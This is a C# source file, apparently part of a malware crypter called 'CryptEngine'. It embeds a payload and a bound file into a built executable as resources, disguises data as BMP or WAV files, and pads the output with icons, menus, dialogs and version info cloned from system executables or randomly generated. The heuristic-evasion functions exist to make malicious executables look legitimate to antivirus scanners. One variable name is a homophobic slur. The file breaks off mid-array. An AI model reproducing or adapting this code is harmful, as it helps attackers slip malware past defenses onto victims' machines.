using CryptEngine.Extensions;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using xNewPE = CryptEngine.NewPE.NewPE;
using Vestris.ResourceLib;

namespace CryptEngine
{
    public static unsafe class Resources
    {

        [DllImport("kernel32.dll")]
        private static extern IntPtr BeginUpdateResource(string szPath, bool delExisting);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool UpdateResource(IntPtr hUpdate, IntPtr lpType, string lpName, ushort wLanguage, string lpData, uint cbData);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool UpdateResource(IntPtr hUpdate, IntPtr lpType, string lpID, ushort wLanguage, byte[] lpData, uint cbData);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool EndUpdateResource(IntPtr hUpdate, bool fDiscard);

        private static Random R = new Random(Guid.NewGuid().GetHashCode());


        public static void CreateHeurVersionInfo(string FilePath)
        {
            VersionResource versionResource = new VersionResource();
            versionResource.FileVersion = "1.0.0.0";
            versionResource.ProductVersion = "1.0.0.0";

            StringFileInfo stringFileInfo = new StringFileInfo();
            versionResource[stringFileInfo.Key] = stringFileInfo;
            StringTable stringFileInfoStrings = new StringTable();
            stringFileInfoStrings.LanguageID = (ushort)langIds[R.Next(0, langIds.Length)];
            stringFileInfoStrings.CodePage = (ushort)charSets[R.Next(0, charSets.Length)];
            stringFileInfo.Strings.Add(stringFileInfoStrings.Key, stringFileInfoStrings);

            stringFileInfoStrings["ProductName"] = GenString(280, 300);
            stringFileInfoStrings["FileDescription"] = GenString(280, 300);
            stringFileInfoStrings["CompanyName"] = GenString(280, 300);
            stringFileInfoStrings["LegalCopyright"] = GenString(280, 300);
           // stringFileInfoStrings["Comments"] = GenString(3, 8);
            stringFileInfoStrings["ProductVersion"] = "1.0.0.0";

            VarFileInfo varFileInfo = new VarFileInfo();
            versionResource[varFileInfo.Key] = varFileInfo;
            VarTable varFileInfoTranslation = new VarTable("Translation");
            varFileInfo.Vars.Add(varFileInfoTranslation.Key, varFileInfoTranslation);
            varFileInfoTranslation[ResourceUtil.USENGLISHLANGID] = 1300;

            versionResource.SaveTo(FilePath);

            //string sys_dir = Environment.GetFolderPath(Environment.SpecialFolder.SystemX86);
            //string[] sys_files = Directory.GetFiles(sys_dir).Where(S => Path.GetExtension(S) == ".exe").OrderBy(X => R.Next()).ToArray();

            //foreach (var sys_file in sys_files)
            //{
            //    using (ResourceInfo ri = new ResourceInfo())
            //    {
            //        ri.Load(sys_file);

            //        try
            //        {
            //            if (ri[Kernel32.ResourceTypes.RT_VERSION].Count > 0)
            //            {
            //                foreach (var rc in ri[Kernel32.ResourceTypes.RT_VERSION])
            //                {
            //                    rc.SaveTo(FilePath);
            //                }
            //                break;
            //            }
            //        }
            //        catch (KeyNotFoundException)
            //        {
            //            continue;
            //        }
            //    }
            //}
        }

        public static void CreateHeurIconSet(string FilePath)
        {
            try
            {
                string sys_dir = Environment.GetFolderPath(Environment.SpecialFolder.SystemX86);
                string[] sys_files = Directory.GetFiles(sys_dir).Where(S => Path.GetExtension(S) == ".exe").OrderBy(X => R.Next()).ToArray();

                foreach (var sys_file in sys_files)
                {
                    using (ResourceInfo ri = new ResourceInfo())
                    {
                        ri.Load(sys_file);

                        try
                        {
                            if (ri[Kernel32.ResourceTypes.RT_GROUP_ICON].Count > 0)
                            {
                                foreach (var rc in ri[Kernel32.ResourceTypes.RT_GROUP_ICON])
                                {
                                    rc.SaveTo(FilePath);
                                }

                                //var rc = ri[Kernel32.ResourceTypes.RT_GROUP_ICON].FirstOrDefault();
                                //rc.SaveTo(FilePath);
                                break;
                            }
                        }
                        catch (KeyNotFoundException)
                        {
                            continue;
                        }
                    }
                }
            }
            catch (Exception)
            {
                return;
            }
        }

        public static void CreateHeurMenuSet(string FilePath)
        {
            try
            {
                string sys_dir = Environment.GetFolderPath(Environment.SpecialFolder.SystemX86);
                string[] sys_files = Directory.GetFiles(sys_dir).Where(S => Path.GetExtension(S) == ".exe").OrderBy(X => R.Next()).ToArray();

                foreach (var sys_file in sys_files)
                {
                    using (ResourceInfo ri = new ResourceInfo())
                    {
                        ri.Load(sys_file);

                        try
                        {
                            if (ri[Kernel32.ResourceTypes.RT_MENU].Count > 0)
                            {
                                foreach (var rc in ri[Kernel32.ResourceTypes.RT_MENU])
                                {
                                    rc.SaveTo(FilePath);
                                }
                                break;
                            }
                        }
                        catch (KeyNotFoundException)
                        {
                            continue;
                        }
                    }
                }
            }
            catch (Exception)
            {
                return;
            }
        }

        public static void CreateHeurDialogSet(string FilePath)
        {
            try
            {
                string sys_dir = Environment.GetFolderPath(Environment.SpecialFolder.SystemX86);
                string[] sys_files = Directory.GetFiles(sys_dir).Where(S => Path.GetExtension(S) == ".exe").OrderBy(X => R.Next()).ToArray();

                foreach (var sys_file in sys_files)
                {
                    using (ResourceInfo ri = new ResourceInfo())
                    {
                        ri.Load(sys_file);

                        try
                        {

                            if (ri[Kernel32.ResourceTypes.RT_DIALOG].Count > 0)
                            {
                                foreach (var rc in ri[Kernel32.ResourceTypes.RT_DIALOG])
                                {
                                    rc.SaveTo(FilePath);
                                }
                                break;
                            }
                        }
                        catch (KeyNotFoundException)
                        {
                            continue;
                        }
                    }
                }
            }
            catch (Exception)
            {
                return;
            }
        }

        public static void CreateHeurAcceleratorSet(string FilePath)
        {
            try
            {
                string sys_dir = Environment.GetFolderPath(Environment.SpecialFolder.SystemX86);
                string[] sys_files = Directory.GetFiles(sys_dir).Where(S => Path.GetExtension(S) == ".exe").OrderBy(X => R.Next()).ToArray();

                foreach (var sys_file in sys_files)
                {
                    using (ResourceInfo ri = new ResourceInfo())
                    {
                        ri.Load(sys_file);

                        try
                        {
                            if (ri[Kernel32.ResourceTypes.RT_ACCELERATOR].Count > 0)
                            {
                                foreach (var rc in ri[Kernel32.ResourceTypes.RT_ACCELERATOR])
                                {
                                    rc.SaveTo(FilePath);
                                }
                                break;
                            }
                        }
                        catch (KeyNotFoundException)
                        {
                            continue;
                        }
                    }
                }
            }
            catch (Exception)
            {
                return;
            }
        }

        public static void CreateHeurCursorSet(string FilePath)
        {
            try
            {
                string sys_dir = Environment.GetFolderPath(Environment.SpecialFolder.SystemX86);
                string[] sys_files = Directory.GetFiles(sys_dir).Where(S => Path.GetExtension(S) == ".exe").OrderBy(X => R.Next()).ToArray();

                foreach (var sys_file in sys_files)
                {
                    using (ResourceInfo ri = new ResourceInfo())
                    {
                        ri.Load(sys_file);

                        try
                        {
                            if (ri[Kernel32.ResourceTypes.RT_CURSOR].Count > 0)
                            {
                                foreach (var rc in ri[Kernel32.ResourceTypes.RT_CURSOR])
                                {
                                    rc.SaveTo(FilePath);
                                }
                                break;
                            }
                        }
                        catch (KeyNotFoundException)
                        {
                            continue;
                        }
                    }
                }
            }
            catch (Exception)
            {
                return;
            }
        }

        public static void CreateHeurStringSet(string FilePath)
        {
            try
            {
                string sys_dir = Environment.GetFolderPath(Environment.SpecialFolder.SystemX86);
                string[] sys_files = Directory.GetFiles(sys_dir).Where(S => Path.GetExtension(S) == ".exe").OrderBy(X => R.Next()).ToArray();

                foreach (var sys_file in sys_files)
                {
                    using (ResourceInfo ri = new ResourceInfo())
                    {
                        ri.Load(sys_file);

                        try
                        {
                            if (ri[Kernel32.ResourceTypes.RT_STRING].Count > 0)
                            {
                                foreach (var rc in ri[Kernel32.ResourceTypes.RT_STRING])
                                {
                                    rc.SaveTo(FilePath);
                                }
                                break;
                            }
                        }
                        catch (KeyNotFoundException)
                        {
                            continue;
                        }
                    }
                }
            }
            catch (Exception)
            {
                return;
            }
        }

        public static void CreateHeurBitmapSet(string FilePath)
        {
            try
            {
                string sys_dir = Environment.GetFolderPath(Environment.SpecialFolder.SystemX86);
                string[] sys_files = Directory.GetFiles(sys_dir).Where(S => Path.GetExtension(S) == ".exe").OrderBy(X => R.Next()).ToArray();

                foreach (var sys_file in sys_files)
                {
                    using (ResourceInfo ri = new ResourceInfo())
                    {
                        ri.Load(sys_file);

                        try
                        {

                            if (ri[Kernel32.ResourceTypes.RT_BITMAP].Count > 0)
                            {
                                int j = 0;
                                foreach (var rc in ri[Kernel32.ResourceTypes.RT_BITMAP])
                                {
                                    if (j < 12)
                                        rc.SaveTo(FilePath);
                                    j++;
                                }
                                break;
                            }
                        }
                        catch (KeyNotFoundException)
                        {
                            continue;
                        }
                    }
                }
            }
            catch (Exception)
            {

            }
        }

        public static void AddMainResourceToBuiltExe(xNewPE PE)
        {
            if (File.Exists(PE.PeDirectory.SavePath))
            {
                IntPtr hUpdate = BeginUpdateResource(PE.PeDirectory.SavePath, false);
                byte[] lpData = PE.PeDirectory.PayloadIncludeBinPath.ReadBytes();

                if (hUpdate == IntPtr.Zero) return;

                //lpData = AppendBmpHeader(lpData);
                //lpData = BitmapDataStorage.CreateBitmapFromData(lpData);

                if (!UpdateResource(hUpdate, (IntPtr)(23), "?", 0x00, lpData, (uint)lpData.Length))
                    return;
                else
                    EndUpdateResource(hUpdate, false);
            }
        }

        public static void AddBindResourceToBuildExe(xNewPE PE)
        {
            if (File.Exists(PE.PeDirectory.SavePath))
            {
                IntPtr hUpdate = BeginUpdateResource(PE.PeDirectory.SavePath, false);
                byte[] lpData = PE.PeDirectory.BindIncPath.ReadBytes();

                if (hUpdate == IntPtr.Zero) return;

                //  lpData = MakeBmpFile(lpData);

                if (!UpdateResource(hUpdate, (IntPtr)(23), "%", 0x00, lpData, (uint)lpData.Length))
                    return;
                else
                    EndUpdateResource(hUpdate, false);
            }
        }

        public static class BitmapDataStorage
        {
            public static byte[] CreateBitmapFromData(byte[] binaryData)
            {
                int paddedSize = binaryData.Length + (3 - binaryData.Length % 3) + 6;
                int pixelCount = paddedSize / 3;

                int countPerRow = (int)Math.Ceiling(Math.Sqrt(pixelCount));

                Bitmap bmp = new Bitmap(countPerRow, countPerRow, PixelFormat.Format24bppRgb);

                byte[] paddedData = new byte[paddedSize];
                Buffer.BlockCopy(BitConverter.GetBytes(binaryData.Length), 0, paddedData, 0, 4);
                Buffer.BlockCopy(binaryData, 0, paddedData, 4, binaryData.Length);

                int columnIndex = 0;
                int rowNumber = bmp.Height - 1;
                for (int i = 0; i < pixelCount; i++)
                {
                    if (columnIndex == countPerRow)
                    {
                        columnIndex = 0;
                        rowNumber--;
                    }

                    Color pixelColor = Color.FromArgb(
                    paddedData[i * 3 + 2],
                    paddedData[i * 3 + 1],
                    paddedData[i * 3]);
                    bmp.SetPixel(columnIndex, rowNumber, pixelColor);
                    columnIndex++;

                }
                return ImageToByte(bmp);
            }

            public static byte[] ReadDataFromBitmap(Bitmap bitmap)
            {
                byte[] buffer = new byte[bitmap.Width * bitmap.Height * 3];

                int i = 0;
                for (int y = bitmap.Height - 1; y >= 0; y--)
                {
                    for (int x = 0; x < bitmap.Width; x++)
                    {
                        Color pixelColor = bitmap.GetPixel(x, y);
                        buffer[i * 3 + 2] = pixelColor.R;
                        buffer[i * 3 + 1] = pixelColor.G;
                        buffer[i * 3] = pixelColor.B;
                        i++;
                    }
                }

                byte[] data = new byte[BitConverter.ToInt32(buffer, 0)];
                Buffer.BlockCopy(buffer, 4, data, 0, data.Length);
                return data;
            }

            public static byte[] ImageToByte(Image img)
            {
                ImageConverter converter = new ImageConverter();
                return (byte[])converter.ConvertTo(img, typeof(byte[]));
            }
        }

        [StructLayout(LayoutKind.Sequential, Pack = 2)]
        struct BITMAPFILEHEADER
        {
            public ushort bfType;
            public uint bfSize;
            public ushort bfReserved1;
            public ushort bfReserved2;
            public uint bfOffbits;
        }
        [StructLayout(LayoutKind.Sequential)]
        struct BITMAPINFOHEADER   /**** BMP file info structure ****/
        {
            public uint biSize;           /* Size of info header */
            public int biWidth;          /* Width of image */
            public int biHeight;         /* Height of image */
            public ushort biPlanes;         /* Number of color planes */
            public ushort biBitCount;       /* Number of bits per pixel */
            public uint biCompression;    /* Type of compression to use */
            public uint biSizeImage;      /* Size of image data */
            public int biXPelsPerMeter;  /* X pixels per meter */
            public int biYPelsPerMeter;  /* Y pixels per meter */
            public uint biClrUsed;        /* Number of colors used */
            public uint biClrImportant;   /* Number of important colors */
        }

        private static byte[] BmpHeader = 
        {
	            0x42, 0x4D, 0xA0, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA0, 0x00, 0x00, 0x00, 0x28, 0x00,
	            0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00,
	            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	            0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        };

        [DllImport("Kernel32.dll")]
        private static extern void CopyMemory(IntPtr pDst, IntPtr pSrc, uint dwCount);

        public static unsafe byte[] AppendBmpHeader(byte[] Data)
        {
            IntPtr pHeader = GCHandle.Alloc(BmpHeader, GCHandleType.Pinned).AddrOfPinnedObject();
            IntPtr pData = GCHandle.Alloc(Data, GCHandleType.Pinned).AddrOfPinnedObject();

            int sizeOfFileHeader = Marshal.SizeOf(typeof(BITMAPFILEHEADER));
            int sizeOfInfoHeader = Marshal.SizeOf(typeof(BITMAPINFOHEADER));

            BITMAPFILEHEADER* pBmpFileHeader = (BITMAPFILEHEADER*)pHeader;
            BITMAPINFOHEADER* pBmpInfoHeader = (BITMAPINFOHEADER*)((IntPtr)(pHeader.ToInt32() + sizeOfFileHeader));

            pBmpFileHeader->bfSize = (uint)Data.Length;

            pBmpInfoHeader->biSize = (uint)sizeOfInfoHeader;
            pBmpInfoHeader->biWidth = 0xFFFFF;
            pBmpInfoHeader->biHeight = 0xFFFFF;
            // pBmpInfoHeader->biSizeImage = (uint)Data.Length;

            uint dwSizeOfAlloc = (uint)(sizeOfFileHeader + sizeOfInfoHeader + Data.Length);
            IntPtr pIcon = Marshal.AllocHGlobal((int)dwSizeOfAlloc);

            CopyMemory(pIcon, (IntPtr)pBmpFileHeader, (uint)sizeOfFileHeader);
            CopyMemory((IntPtr)(pIcon.ToInt32() + sizeOfFileHeader), (IntPtr)pBmpInfoHeader, (uint)sizeOfInfoHeader);
            CopyMemory((IntPtr)(pIcon.ToInt32() + sizeOfFileHeader + sizeOfInfoHeader), pData, (uint)Data.Length);

            byte[] pIconBuffer = new byte[sizeOfFileHeader + sizeOfInfoHeader + Data.Length];
            Marshal.Copy(pIcon, pIconBuffer, 0, BmpHeader.Length + Data.Length);

            return pIconBuffer;
        }

        private static byte[] MakeWavFile(byte[] Data)
        {

            byte[] wav_hdr = 
            {
	            0x52, 0x49, 0x46, 0x46, 0x5E, 0xD5, 0x00, 0x00, 0x57, 0x41, 0x56, 0x45, 0x66, 0x6D, 0x74, 0x20,
	            0x10, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x11, 0x2B, 0x00, 0x00, 0x22, 0x56, 0x00, 0x00,
	            0x02, 0x00, 0x10, 0x00, 0x64, 0x61, 0x74, 0x61, 0x3A, 0xD5, 0x00, 0x00
            };

            byte[] ret_buffer = new byte[Data.Length + wav_hdr.Length];

            Buffer.BlockCopy(wav_hdr, 0, ret_buffer, 0, wav_hdr.Length);
            Buffer.BlockCopy(Data, 0, ret_buffer, wav_hdr.Length, Data.Length);

            return ret_buffer;
        }

        private static byte[] MakeBmpFile(byte[] Data)
        {
            byte[] bmp_hdr = 
            {
	            0x42, 0x4D, 0xA0, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA0, 0x00, 0x00, 0x00, 0x28, 0x00,
	            0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00,
	            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x80,
	            0x00, 0x00, 0x00, 0x80, 0x80, 0x00, 0x80, 0x00, 0x00, 0x00, 0x80, 0x00, 0x80, 0x00, 0x80, 0x80,
	            0x00, 0x00, 0xC0, 0xC0, 0xC0, 0x00, 0x80, 0x80, 0x80, 0x00, 0x00, 0x00, 0xFF, 0x00, 0x00, 0xFF,
	            0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0xFF, 0x00, 0x00, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0xFF,
	            0x00, 0x00, 0xFF, 0xFF, 0xFF
            };

            byte[] ret_buffer = new byte[Data.Length + bmp_hdr.Length];

            Buffer.BlockCopy(bmp_hdr, 0, ret_buffer, 0, bmp_hdr.Length);
            Buffer.BlockCopy(Data, 0, ret_buffer, bmp_hdr.Length, Data.Length);

            return ret_buffer;
        }

        public static void AddResourceToFile(string OrigFile, string ResFile, string ResFileName)
        {
            IntPtr hUpdate = BeginUpdateResource(OrigFile, false);
            byte[] lpData = File.ReadAllBytes(ResFile);
            if (hUpdate == null) return;
            if (!UpdateResource(hUpdate, (IntPtr)10, ResFileName, 0x00, lpData, Convert.ToUInt32(lpData.Length)))
                return;
            else
                EndUpdateResource(hUpdate, false);
        }

        private static void UpdateResourceInFile(string FileName, string ResourcePath, string Type, string Name)
        {
            // -add ExeFileName, ResultingFileName, ResourceAddress, ResourceType, ResourceName, 0

            string ResHackerArgs = "-addoverwrite {0}, {0}, {1}, {2}, {3},";
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.Arguments = String.Format(ResHackerArgs, FileName, ResourcePath, Type, Name);
            psi.FileName = Path.Combine(Path.GetDirectoryName(ResourcePath), "ResHacker.exe");

            Process.Start(psi).WaitForExit();
        }

        private static void UpdateVersionInfoInFile(string FileName, string ResDirectory)
        {
            string VPatcherArgs = Properties.Resources.VPatcher;
            VPatcherArgs = VPatcherArgs.Replace("[FilePath]", FileName);
            VPatcherArgs = RandomizeVPatcher(VPatcherArgs);

            ProcessStartInfo psi = new ProcessStartInfo();
            psi.Arguments = VPatcherArgs;
            psi.FileName = Path.Combine(ResDirectory, "verpatch.exe");
            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = true;

            using (Process p = Process.Start(psi))
            {
                using (StreamReader sr = p.StandardOutput)
                {
                    Console.WriteLine(sr.ReadToEnd());
                }
            }
        }

        private static FileVersionInfo ExtractVersionInfoInFile(string FileName)
        {
            return FileVersionInfo.GetVersionInfo(FileName);
        }

        public static void ConstructRandomIconSet(string FilePath, string ResDirectory)
        {
            int j = R.Next(2, 30);

            for (int i = 0; i < j; i++)
            {
                IconFormat ico = GenRandIcon();

                string icon_path = Path.Combine(ResDirectory, ico.IconName + ".ico");
                string script_path = Path.Combine(ResDirectory, ico.IconName + ".rc");

                ico.Icon.WriteFileBytes(icon_path);
                script_path.WriteText(ico.IconScript, StringEncoding.UNICODE);

                ProcessStartInfo psi = new ProcessStartInfo();
                // <--- Init ProcStartInfo --->
                psi.Arguments = String.Concat("\"", script_path, "\"");
                psi.FileName = Path.Combine(ResDirectory, "RC.exe");
                psi.RedirectStandardOutput = true;
                psi.UseShellExecute = false;

                using (Process proc = Process.Start(psi))
                {
                    using (StreamReader sReader = proc.StandardOutput)
                    {
                        string result = sReader.ReadToEnd();
                        Console.WriteLine(result);
                    }
                }

                script_path = Path.ChangeExtension(script_path, ".res");

                UpdateResourceInFile(FilePath, script_path, "icon", ico.IconName);
                //AddResourceToFile(FilePath, script_path, "icon");
            }
        }

        public static void ConstructRandomStringTable(string FilePath, string ResDirectory)
        {
            int j = R.Next(2, 6);

            for (int i = 0; i < j; i++)
            {
                string st = GenerateRandStringTable();
                string st_path = Path.Combine(ResDirectory, String.Concat(Path.GetFileNameWithoutExtension(Path.GetRandomFileName()), ".rc"));
                st_path.WriteText(st, StringEncoding.UNICODE);

                ProcessStartInfo psi = new ProcessStartInfo();
                // <--- Init ProcStartInfo --->
                psi.Arguments = String.Concat("\"", st_path, "\"");
                psi.FileName = Path.Combine(ResDirectory, "RC.exe");
                psi.RedirectStandardOutput = true;
                psi.UseShellExecute = false;

                using (Process proc = Process.Start(psi))
                {
                    using (StreamReader sReader = proc.StandardOutput)
                    {
                        string result = sReader.ReadToEnd();
                        Console.WriteLine(result);
                    }
                }

                st_path = Path.ChangeExtension(st_path, ".res");

                byte[] str_table_buffer = st_path.ReadBytes();
                int str_table_id = 0;

                using (MemoryStream ms = new MemoryStream(str_table_buffer))
                {
                    using (BinaryReader br = new BinaryReader(ms))
                    {
                        for (int x = 0; x < 0x2E; x++)
                            br.ReadByte();

                        str_table_id = br.ReadInt32();
                    }
                }

                UpdateResourceInFile(FilePath, st_path, "stringtable", str_table_id.ToString());
            }
        }

        public static void ConstructVersionInfo(string FilePath, string ClonePath, string ResDirectory)
        {
            string vi = GenerateRandVersionInfo(FilePath); //CloneVersionInfo(ClonePath);
            string vi_path = Path.Combine(ResDirectory, String.Concat(Path.GetFileNameWithoutExtension(Path.GetRandomFileName()), ".rc"));
            vi_path.WriteText(vi, StringEncoding.UNICODE);

            ProcessStartInfo psi = new ProcessStartInfo();
            // <--- Init ProcStartInfo --->
            psi.Arguments = String.Concat("\"", vi_path, "\"");
            psi.FileName = Path.Combine(ResDirectory, "RC.exe");
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;

            Process.Start(psi).WaitForExit();

            vi_path = Path.ChangeExtension(vi_path, ".res");
            UpdateResourceInFile(FilePath, vi_path, "versioninfo", "1");
        }

        public static void CloneVersionInfo(string SourceFilePath, string DestFilePath, string ResDirectory)
        {
            string VPatcherArgs = Properties.Resources.VPatcher;
            VPatcherArgs = VPatcherArgs.Replace("[FilePath]", DestFilePath);

            FileVersionInfo FVI = FileVersionInfo.GetVersionInfo(SourceFilePath);

            VPatcherArgs = VPatcherArgs.Replace("[FileVersion]", FVI.FileVersion);
            VPatcherArgs = VPatcherArgs.Replace("[Description]", FVI.FileDescription);
            VPatcherArgs = VPatcherArgs.Replace("[Copyright]", FVI.LegalCopyright);
            VPatcherArgs = VPatcherArgs.Replace("[Company]", FVI.CompanyName);
            VPatcherArgs = VPatcherArgs.Replace("[ProductName]", FVI.ProductName);
            VPatcherArgs = VPatcherArgs.Replace("[ProductVersion]", FVI.ProductVersion);

            ProcessStartInfo psi = new ProcessStartInfo();
            psi.Arguments = VPatcherArgs;
            psi.FileName = "\"" + Path.Combine(ResDirectory, "verpatch.exe") + "\"";
            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = true;

            using (Process p = Process.Start(psi))
            {
                using (StreamReader sr = p.StandardOutput)
                {
                    Console.WriteLine(sr.ReadToEnd());
                }
            }
        }

        public static void ConstructHeuristicVersionInfo(string FilePath, string ResDirectory)
        {
            UpdateVersionInfoInFile(FilePath, ResDirectory);
            //string sys_dir = Environment.GetFolderPath(Environment.SpecialFolder.SystemX86);
            //string[] sys_files = Directory.GetFiles(sys_dir).Where(S => Path.GetExtension(S) == ".exe").ToArray();
            //string sys_file = sys_files[R.Next(0, sys_files.Length)];

            // <--- Will require admin priveleges to read --->
            //string vi = CloneVersionInfo(sys_file);
            //string vi_path = Path.Combine(ResDirectory, String.Concat(Path.GetFileNameWithoutExtension(Path.GetRandomFileName()), ".rc"));
            //vi_path.WriteText(vi, StringEncoding.UNICODE);

            //ProcessStartInfo psi = new ProcessStartInfo();
            // <--- Init ProcStartInfo --->
            //psi.Arguments = String.Concat("\"", vi_path, "\"");
            //psi.FileName = Path.Combine(ResDirectory, "RC.exe");
            //psi.RedirectStandardOutput = true;
            //psi.UseShellExecute = false;

            //Process.Start(psi).WaitForExit();

            //vi_path = Path.ChangeExtension(vi_path, ".res");
            //UpdateResourceInFile(FilePath, vi_path, "versioninfo", "1");
        }

        private static string GenVersionPeriod()
        {
            string frmt = "{0}.{1}.{2}.{3}";
            return string.Format(frmt, R.Next(1, 5), R.Next(0, 5), R.Next(0, 9), R.Next(0, 9));
        }

        private static string GenString(int Min, int Max)
        {
            StringBuilder sb = new StringBuilder();
            int len = R.Next(Min, Max);
            char ch;
            for (int i = 0; i < len; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * R.NextDouble() + 65)));
                if (i % 2 == 0)
                    ch = Char.ToLower(ch);
                sb.Append(ch);
            }
            return sb.ToString().TrimEnd();
        }

        private static string GenCopyRight()
        {
            //sry sal can't stand this
            int minyear = 4;
            //wtf lol ill hope it works
            string yrval = R.Next(minyear, (DateTime.Now.Year - 2000) + 1).ToString();
            string yr = "2000".Insert(4 - yrval.Length, yrval).Substring(0, 4); // .substring? to only get the first 4 characters. it was just pushing out the extra 0's
            return String.Concat("Copyright (C)", " ", yr, " ", GenWordString(4, 12, R.Next(1, 4)));
        }

        private static string GenCompanyName()
        {
            string[] faggot_Tcs = new string[]
            {
                "Ltd.",
                "Inc.",
                "ltd.",
                "inc.",
                "LTD.",
                "INC.",
                "CORP.",
                "corp.",
                "Corp.",
                "LLC.",
                "llc.",
                "Llc.",
                "LLLP.",
                "Lllp.",
                "NPO.",
                "npo.",
                "Npo."
            };

            string biz_suffix = faggot_Tcs[R.Next(0, faggot_Tcs.Length)];

            string[] formats = new string[]{
                //{0}, {1}, {2} = name
                //{3} = suffix
                "{0} {1} {2} {3}",
                "{0} {1} {3} {2}",
                "{0} {3} {2} {1}",            
            };
            string format = formats[R.Next(0, formats.Length)];

            return String.Format(
                format,
                GenString(R.Next(3, 8), R.Next(10, 15)),
                GenString(R.Next(3, 8), R.Next(10, 15)),
                GenString(R.Next(3, 8), R.Next(10, 15)),
                biz_suffix
            );
        }

        private static string GenWordString(int Min, int Max, int words)
        {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < words; i++)
            {
                sb.Append(GenString(Min, Max));
                sb.Append(" ");
            }
            return sb.ToString().TrimEnd();
        }

        #region char_sets

        static int[] langIds = new int[]   
        {
                0x0401,	// Arabic
                0x0415,	// Polish
                0x0402,	// Bulgarian
            	0x0416,	// Portuguese (Brazil)
                0x0403,	// Catalan	
                0x0417,	// Rhaeto-Romanic
                0x0404,	// Traditional Chinese	
                0x0418,	// Romanian
                0x0405,	// Czech	
                0x0419,	// Russian
                0x0406,	// Danish	
                0x041A,	// Croato-Serbian (Latin)
                0x0407,	// German	
                0x041B,	// Slovak
                0x0408,	// Greek	
                0x041C,	// Albanian
                0x0409,	// U.S. English	
                0x041D,	// Swedish
                0x040A,	// Castilian Spanish	
                0x041E,	// Thai
                0x040B,	// Finnish	
                0x041F,	// Turkish
                0x040C,	// French	
                0x0420,	// Urdu
                0x040D,	// Hebrew	
                0x0421,	// Bahasa
                0x040E,	// Hungarian	
                0x0804,	// Simplified Chinese
                0x040F,	// Icelandic	
                0x0807,	// Swiss German
                0x0410, // Italian	
                0x0809, // U.K. English
                0x0411,	// Japanese	
                0x080A,	// Spanish (Mexico)
                0x0412,	// Korean	
                0x080C,	// Belgian French
                0x0413,	// Dutch	
                0x0C0C,	// Canadian French
                0x0414,	// Norwegian – Bokmal	
                0x100C,	// Swiss French
                0x0810,	// Swiss Italian	
                0x0816,	// Portuguese (Portugal)
                0x0813,	// Belgian Dutch	
                0x081A,	// Serbo-Croatian (Cyrillic)
                0x0814	// Norwegian – Nynorsk
        };

        static int[] charSets = new int[]
        {
            0,	    // 7-bit ASCII
            932,	// Japan (Shift – JIS X-0208)
            949,    // Korea (Shift – KSC 5601)
            950,	// Taiwan (Big5)
            1200,	// Unicode
            1250,	// Latin-2 (Eastern European)
            1251,	// Cyrillic
            1252,	// Multilingual
            1253,	// Greek
            1254,	// Turkish
            1255,	// Hebrew
            1256	// Arabic
        };

        #endregion

        #region icon_shit

        private static byte[] icon_data = 
        {
	        0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x20, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA8, 0x10,
	        0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x40, 0x00,
	        0x00, 0x00, 0x01, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00,
	        0x00, 0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
	        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00, 0x00, 0x01, 0x01, 0x00, 0x01, 0x00,
	        0x01, 0x00, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00, 0x00, 0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00,
	        0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00,
	        0x00, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x01, 0x01,
	        0x01, 0x00, 0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x01, 0x01, 0x00,
